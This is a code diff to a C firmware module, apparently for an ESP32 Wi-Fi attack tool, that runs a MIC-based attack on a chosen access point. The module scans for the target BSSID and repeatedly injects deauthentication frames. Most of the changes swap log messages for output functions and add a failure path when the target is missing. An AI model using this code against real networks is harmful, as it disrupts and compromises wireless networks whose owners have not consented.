@@ -32,9 +32,8 @@ void arma_mic_set_target(char *target_bssid) {
     uint8_t s2 = target_bssid[i + i + 1];
     u_target_bssid[i] = convert_to_uint8_t(s1, s2);
   }
-
   printf(
-      "arma_mic.arma_mic_set_target > Set target AP: "
+      "arma_mic.arma_mic_set_target > Target set AP: "
       "%02X%02X%02X%02X%02X%02X\n",
       u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
       u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
@@ -46,7 +45,6 @@ void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
   notification_data = (arma_atk_event_data_t *)event_data;
 
   if (notification_data->atk_context == MIC_BASED) {
-    printf("arma_mic.mic_notif > Received MIC attack notification\n");
     arma_mic_finishing_sequence();
     output_success_mic_attack(u_target_bssid);
   }
@@ -55,17 +53,13 @@ void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
 void arma_mic_notif_event_register() {
   ESP_ERROR_CHECK(esp_event_handler_register(
       ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif, NULL));
-  printf(
-      "arma_mic.arma_mic_notif_event_register > Registered MIC attack "
-      "notification\n");
+  printf("arma_mic.arma_mic_notif_event_register > Registered mic_notif\n");
 }
 
 void arma_mic_notif_event_unregister() {
   ESP_ERROR_CHECK(esp_event_handler_unregister(
       ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif));
-  printf(
-      "arma_mic.arma_mic_notif_event_unregister > Unregistered MIC attack "
-      "notification\n");
+  printf("arma_mic.arma_mic_notif_event_unregister > Unregistered mic_notif\n");
 }
 
 void arma_mic_delete_task_deauth_inject() {
@@ -73,15 +67,13 @@ void arma_mic_delete_task_deauth_inject() {
     vTaskDelete(mic_deauth_inject_task_handle);
     mic_deauth_inject_task_handle = NULL;
     printf(
-        "arma_mic.arma_mic_delete_task_deauth_inject > MIC burst deauth task "
-        "deleted\n");
+        "arma_mic.arma_mic_delete_task_deauth_inject > Task "
+        "arma_mic_inject_deauth was deleted\n");
   }
 }
 
 void arma_mic_finishing_sequence() {
-  printf(
-      "arma_mic.arma_mic_finishing_sequence > MIC ATTACK FINISHING "
-      "SEQUENCE\n");
+  output_mic_finishing_sequence();
   frame_parser_unregister_data_frame_handler();
   frame_parser_clear_target_parameter();
   arma_mic_notif_event_unregister();
@@ -90,27 +82,25 @@ void arma_mic_finishing_sequence() {
 }
 
 void arma_mic_inject_deauth() {
-  printf("arma_mic.arma_mic_inject_deauth > MIC burst deauth task created\n");
+  printf(
+      "arma_mic.arma_mic_inject_deauth > Task arma_mic_inject_deauth was "
+      "created\n");
   output_mic_operation_started(u_target_bssid);
-  int currentTime = 0;
+  int current_time = 0;
 
   while (1) {
     vTaskDelay(1000 / portTICK_PERIOD_MS);
-    if (currentTime % 3 == 0) {
-      printf("arma_mic.arma_mic_inject_deauth > (%d) Injecting deauth\n",
-             currentTime);
+    if (current_time % 3 == 0) {
+      printf("arma_mic.arma_mic_inject_deauth > Injecting deauth\n");
       arma_deauth_inject();
-    } else {
-      printf("arma_mic.arma_mic_inject_deauth > (%d) Time elapsed\n",
-             currentTime);
     }
-    currentTime++;
+    output_mic_deauth_status(current_time);
+    current_time++;
   }
 }
 
 void arma_mic_launching_sequence(uint8_t channel) {
-  printf(
-      "arma_mic.arma_mic_launching_sequence > MIC ATTACK LAUNCHING SEQUENCE\n");
+  output_deauth_launching_sequence();
   frame_parser_set_target_parameter(u_target_bssid, PARSE_MIC);
   frame_parser_register_data_frame_handler();
   arma_mic_notif_event_register();
@@ -133,16 +123,25 @@ void arma_mic(char *target_bssid) {
   uint16_t total_scanned_aps = ap_list->count;
   printf("arma_mic.arma_mic > Found %u APs\n", total_scanned_aps);
 
+  uint8_t found_target_ap = 0;
+  uint8_t index_of_target_ap = 0;
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
     output_ap_info(&ap_record);
 
     if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
-      uint8_t channel = ap_record.primary;
-      printf("arma_mic.arma_mic > Channel of AP: %u\n", channel);
-
-      arma_mic_launching_sequence(channel);
-      break;
+      found_target_ap = 1;
+      index_of_target_ap = i;
     }
+  }
+
+  if (found_target_ap == 1) {
+    wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
+    uint8_t channel = ap_record.primary;
+
+    printf("arma_mic.arma_mic > Target AP channel: %u\n", channel);
+    arma_mic_launching_sequence(channel);
+  } else if (found_target_ap == 0) {
+    output_failed_mic_attack(u_target_bssid);
   }
 }
